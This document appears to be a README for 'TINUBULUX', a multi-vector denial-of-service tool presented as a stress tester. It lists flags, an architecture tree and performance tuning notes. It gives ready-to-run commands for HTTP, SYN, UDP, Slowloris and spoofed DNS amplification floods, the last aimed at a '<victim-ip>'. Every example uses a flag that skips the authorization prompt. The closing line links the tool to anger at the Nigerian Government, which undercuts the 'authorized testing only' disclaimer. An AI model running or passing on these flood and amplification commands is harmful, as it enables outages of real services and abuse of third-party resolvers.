<img src="file_00000000aa7071f4a447333952d6ec10.png" alt="TINUBULUX Banner" width="800"/>

# TINUBULUX 🔥

> *"Real power. No simulations. Built by Anonymous-beta."*

High-performance network stress testing framework. Multi-vector. Multi-process. Rate-limited. Terminal UI. Linux-native.

**v1.1** — batched stats (no per-packet lock contention), per-worker rate limiting, keep-alive connection reuse, real raw-socket DNS amplification, fixed TUI duration handling, and a built-in authorization gate.

## Quick Start

```bash
# Install dependencies
pip3 install -r requirements.txt

# HTTP Flood (default) — 1000 workers, 500 pps/worker
sudo python3 tinubulux.py -t target.com -p 80 -m http -c 1000 -r 500 -y

# SYN Flood (requires root for raw sockets)
sudo python3 tinubulux.py -t 192.168.1.1 -p 80 -m syn -c 500 -y

# UDP Flood — unlimited rate
python3 tinubulux.py -t target.com -p 53 -m udp -c 2000 -y

# Slowloris — holds sockets, not bandwidth
python3 tinubulux.py -t target.com -p 80 -m slowloris -y

# DNS Amplification (root + open resolvers in config.yaml)
sudo python3 tinubulux.py -t <victim-ip> -p 53 -m dns -c 50 -y
```

> **Note:** `-y` skips the authorization confirmation prompt. Without it, TINUBULUX asks you to confirm you have written authorization for the target before sending any traffic. DNS mode requires `--target` to be an **IP address** (the source is spoofed) and resolvers configured in `config.yaml` under `dns.dns_servers`.

## Flags

| Flag | Description | Default |
|------|-------------|---------|
| `-t, --target` | Target IP/hostname | required |
| `-p, --port` | Target port | 80 |
| `-m, --method` | Attack method (http/syn/udp/slowloris/dns) | http |
| `-c, --connections` | Concurrent workers | 500 |
| `-d, --duration` | Duration in seconds (0 = unlimited) | 60 |
| `--threads` | OS-level threads | 4 |
| `-r, --rate` | Packets/sec **per worker** (0 = unlimited) | 0 |
| `--no-ui` | Disable TUI, console only | false |
| `--proxy-file` | Proxy list file (host:port) | none |
| `--user-agent` | Custom User-Agent string | none |
| `--config` | Config file path | config.yaml |
| `-v, --verbose` | Verbose output | false |
| `-y, --yes` | Skip authorization confirmation | false |

## Architecture

```
tinubulux.py              # Entry point, signal handling, auth gate
├── core/
│   ├── engine.py         # Orchestrator (multiprocessing + threading)
│   └── attackers/
│       ├── base.py       # Batched stats + rate limiting base class
│       ├── http_flood.py # HTTP flood w/ keep-alive reuse
│       ├── syn_flood.py  # Raw SYN packets, randomized windows
│       ├── udp_flood.py  # Persistent-socket UDP flood
│       ├── slowloris.py  # Async-ready socket holding, retry backoff
│       └── dns_amp.py    # Spoofed raw DNS amplification
├── frontend/
│   └── cli.py            # Rich terminal UI
├── utils/
│   ├── logger.py         # Console logging
│   └── stats.py          # Shared cross-process counters
└── config.yaml           # Default configuration
```

## Performance Notes

- **Batched stats** — workers buffer counts locally and flush every 50 ops / 0.5s instead of locking shared memory per packet
- **Rate limiting** — `-r` caps packets/sec *per worker*; total throughput ≈ `rate × workers`
- **Keep-alive reuse** — HTTP mode reuses one connection for up to `max_requests_per_conn` requests instead of reconnecting per hit
- **UDP** — one persistent socket per worker, no socket churn
- **Slowloris** — dead sockets are retried with backoff and replaced in place (no unbounded list growth)

## Requirements

- Python 3.8+
- Linux (raw sockets for SYN/DNS modes)
- Root privileges for SYN and DNS amplification modes

## Legal

This tool is for **authorized security testing only**. The author assumes no liability for misuse. TINUBULUX requires explicit confirmation of target authorization before running.
Built with cold coffee and frustration caused by the Nigerian Government 😡.